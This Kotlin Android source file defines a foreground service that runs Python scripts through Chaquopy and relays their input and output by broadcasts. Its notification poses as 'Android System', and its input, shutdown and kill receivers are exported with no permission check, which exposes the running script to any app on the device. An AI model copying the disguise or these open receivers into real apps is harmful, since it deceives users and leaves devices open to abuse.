package com.client.services.python

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import android.os.IBinder
import android.os.Process
import android.util.Log
import androidx.core.app.NotificationCompat
import com.chaquo.python.Python
import com.chaquo.python.android.AndroidPlatform
import com.client.services.client.KILL_SELF_BROADCAST
import kotlinx.coroutines.*

/**
 * PythonRunnerService runs a Python script interactively.
 *
 * It expects the following extras in the start intent:
 * - EXTRA_SCRIPT_PATH: String path to the Python script file.
 * - EXTRA_ARGUMENTS: ArrayList<String> of arguments.
 *
 * The service uses PythonInteractiveScriptRunner (which you have defined)
 * to run the script. As the script produces output or errors, the service
 * broadcasts them using ACTION_OUTPUT and ACTION_ERROR intents.
 *
 * Additionally, this service listens for broadcasts with action ACTION_INPUT
 * to forward input to the PythonInteractiveScriptRunner, and for broadcasts
 * with action ACTION_SHUTDOWN to force the service to stop.
 *
 * A SharedPreferences flag is maintained so other components can check if
 * the service is running.
 */
class PythonInteractiveScriptRunnerService : Service() {

    private val notificationChannelId = "python_runner_service_channel"
    private var notificationChannel: NotificationChannel? = null
    private var notificationManager: NotificationManager? = null
    private var notification: Notification? = null

    companion object {
        const val EXTRA_SCRIPT_PATH = "ScriptPath"
        const val EXTRA_ARGUMENTS = "Arguments"
        const val ACTION_OUTPUT = "com.client.services.others.PythonInteractiveScriptRunnerService.PythonScriptService.OUTPUT"
        const val ACTION_ERROR = "com.client.services.others.PythonInteractiveScriptRunnerService.PythonScriptService.ERROR"
        const val ACTION_INPUT = "com.client.services.others.PythonInteractiveScriptRunnerService.PythonScriptService.INPUT"
        const val ACTION_SHUTDOWN = "com.client.services.others.PythonInteractiveScriptRunnerService.PythonScriptService.SHUTDOWN"
        const val EXTRA_OUTPUT = "Output"
        const val EXTRA_ERROR = "Error"
        const val EXTRA_INPUT = "Input"
    }

    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private lateinit var pythonInstance: Python
    private var runner: PythonInteractiveScriptRunner? = null
    private var inputReceiver: BroadcastReceiver? = null
    private var shutdownReceiver: BroadcastReceiver? = null

    override fun onCreate() {
        super.onCreate()
        if (!Python.isStarted()) {
            Python.start(AndroidPlatform(this))
        }
        pythonInstance = Python.getInstance()
        registerInputReceiver()
        registerShutdownReceiver()
    }

    private fun createPythonRunnerServiceNotificationChannel(context: Context?) {
        if (notificationChannel == null) {
            notificationChannel = NotificationChannel(notificationChannelId, "ClientStarterChannel", NotificationManager.IMPORTANCE_HIGH)
            notificationManager = context?.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            notificationManager!!.createNotificationChannel(notificationChannel!!)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        createPythonRunnerServiceNotificationChannel(this)
        notification = NotificationCompat.Builder(this, notificationChannelId)
            .setContentText("Android System is running...")
            .setContentTitle("Android System")
            .build()
        startForeground(3, notification)

        val killSelfBroadcastReceiver = object : BroadcastReceiver() {
            override fun onReceive(context: Context, intent: Intent) {
                Log.d("PythonRunnerService", "Received kill self broadcast")
                Process.killProcess(Process.myPid())
            }
        }
        registerReceiver(killSelfBroadcastReceiver, IntentFilter(KILL_SELF_BROADCAST), RECEIVER_EXPORTED)

        val scriptPath = intent?.getStringExtra(EXTRA_SCRIPT_PATH)
        val arguments = intent?.getStringArrayListExtra(EXTRA_ARGUMENTS) ?: arrayListOf()

        Log.i("PythonRunnerService", "onStartCommand: scriptPath = $scriptPath")
        if (scriptPath.isNullOrEmpty()) {
            broadcastError("No script path provided.")
            stopSelf()
            return START_NOT_STICKY
        }

        serviceScope.launch {
            try {
                runner = PythonInteractiveScriptRunner(
                    context = this@PythonInteractiveScriptRunnerService,
                    applicationContext = applicationContext,
                    scriptPath = scriptPath,
                    args = arguments,
                    outputCallback = { output ->
                        Log.d("PythonRunnerService", "Output: $output")
                        broadcastOutput(output)
                    },
                    errorCallback = { error ->
                        broadcastError(error)
                    }
                )
                runner?.startScript()
                while (runner?.isScriptRunning() == true) {
                    delay(500)
                }
            } catch (e: Exception) {
                broadcastError("Exception in python interactive runner service service: ${e.localizedMessage}")
            } finally {
                stopSelf()
            }
        }
        return START_NOT_STICKY
    }

    override fun onDestroy() {
        Log.i("PythonRunnerService", "On destroy called")
        unregisterInputReceiver()
        unregisterShutdownReceiver()
        serviceScope.cancel()
        // Forcefully terminate the process running this service (ensure this service is in its own process).
        Process.killProcess(Process.myPid())
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun broadcastOutput(output: String) {
        val intent = Intent(ACTION_OUTPUT).apply {
            putExtra(EXTRA_OUTPUT, output)
        }
        sendBroadcast(intent)
    }

    private fun broadcastError(error: String) {
        val intent = Intent(ACTION_ERROR).apply {
            putExtra(EXTRA_ERROR, error)
        }
        sendBroadcast(intent)
        Log.e("PythonRunnerService", error)
    }

    /**
     * Registers a broadcast receiver to listen for input to send to the Python script.
     */
    private fun registerInputReceiver() {
        val filter = IntentFilter(ACTION_INPUT)
        inputReceiver = object : BroadcastReceiver() {
            override fun onReceive(context: Context?, intent: Intent?) {
                val input = intent?.getStringExtra(EXTRA_INPUT)
                if (!input.isNullOrEmpty()) {
                    runner?.sendInput(input)
                }
            }
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(inputReceiver, filter, Context.RECEIVER_EXPORTED)
        } else {
            registerReceiver(inputReceiver, filter)
        }
    }

    private fun unregisterInputReceiver() {
        inputReceiver?.let { unregisterReceiver(it) }
    }

    /**
     * Registers a broadcast receiver to listen for a shutdown signal.
     * When an ACTION_SHUTDOWN broadcast is received, the service stops itself.
     */
    private fun registerShutdownReceiver() {
        val filter = IntentFilter(ACTION_SHUTDOWN)
        shutdownReceiver = object : BroadcastReceiver() {
            override fun onReceive(context: Context?, intent: Intent?) {
                broadcastOutput("Shutdown signal received. Stopping service.")
                serviceScope.cancel()
                stopSelf()
            }
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(shutdownReceiver, filter, Context.RECEIVER_EXPORTED)
        } else {
            registerReceiver(shutdownReceiver, filter)
        }
    }

    private fun unregisterShutdownReceiver() {
        shutdownReceiver?.let { unregisterReceiver(it) }
    }
}
